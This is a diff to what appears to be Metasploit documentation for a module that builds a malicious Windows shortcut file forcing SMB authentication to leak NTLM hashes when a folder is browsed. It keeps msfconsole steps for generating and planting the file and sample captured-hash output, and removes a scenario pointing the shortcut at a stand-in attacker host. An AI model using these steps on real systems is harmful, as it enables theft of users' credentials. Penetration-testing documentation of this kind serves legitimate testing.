@@ -1,7 +1,3 @@
-This module generates a malicious Windows shortcut (LNK) file that embeds a special UNC path within the IconEnvironmentDataBlock of the Shell Link structure. When a victim browses to the directory containing the LNK file in Windows Explorer, it triggers an automatic authentication attempt to the specified remote SMB server, allowing for the capture of NTLM hashes.
-
-The exploit relies on how Windows processes LNK files with manipulated environment data blocks, leading to unsolicited SMB connections without requiring the user to open the file.
-
 ## Vulnerable Application
 
 Windows systems using Explorer to browse directories with LNK files, where the IconEnvironmentDataBlock can force SMB authentication leaks.
@@ -14,36 +10,16 @@ Disclosure Date: 2025-05-16.
 ## Verification Steps
 
 1. Start msfconsole.
-2. Load the module: `use auxiliary/fileformat/iconenvironmentdatablock_lnk`.
-3. Set options like FILENAME, UNC_PATH, or others as needed.
-4. Execute the module: `run`.
-5. A malicious LNK file is generated.
-6. If UNC_PATH is not set, an integrated SMB capture server starts.
-7. Place the LNK in a target directory.
-8. Browse the directory in Windows Explorer to trigger the SMB connection.
-9. Check the console for captured NTLM hashes.
+1. Load the module: `use auxiliary/fileformat/iconenvironmentdatablock_lnk`.
+1. Set options like FILENAME, or others as needed.
+1. Execute the module: `run`.
+1. A malicious LNK file is generated.
+1. Place the LNK in a target directory.
+1. Browse the directory in Windows Explorer to trigger the SMB connection.
+1. Check the console for captured NTLM hashes.
 
 ## Options
 
-### FILENAME
-
-The name of the generated LNK file.
-
-Default: `msf.lnk`
-
-Example:
-```
-set FILENAME leak.lnk
-```
-
-### UNC_PATH
-
-The UNC path (e.g., `\\server\share`) for the LNK to connect to. If unset, the module starts its own SMB server.
-
-Example:
-```
-set UNC_PATH \\192.168.1.100\share
-```
 
 ### DESCRIPTION
 
@@ -74,29 +50,6 @@ Example:
 set PADDING_SIZE 20
 ```
 
-### Advanced Options
-
-**SRVHOST**
-
-Local host for the integrated SMB server (if UNC_PATH is unset).
-
-Default: `0.0.0.0`
-
-Example:
-```
-set SRVHOST 192.168.1.25
-```
-
-**SRVPORT**
-
-Local port for the integrated SMB server.
-
-Default: `445`
-
-Example:
-```
-set SRVPORT 445
-```
 
 ## Scenarios
 
@@ -133,21 +86,3 @@ LM_CLIENT_CHALLENGE:Disabled
 NTHASH:samplehash
 NT_CLIENT_CHALLENGE:samplechallenge
 ```
-
-Crack the hash with tools like Hashcat.
-
-### Custom UNC Path Usage
-
-For an external SMB setup:
-
-```
-msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > set UNC_PATH \\attacker.com\captureshare
-UNC_PATH => \\attacker.com\captureshare
-msf auxiliary(fileformat/iconenvironmentdatablock_lnk) > run
-
-[*] Creating 'msf.lnk' file...
-[+] LNK file created: msf.lnk
-[*] Auxiliary module execution completed
-```
-
-Monitor the external server for authentication attempts.
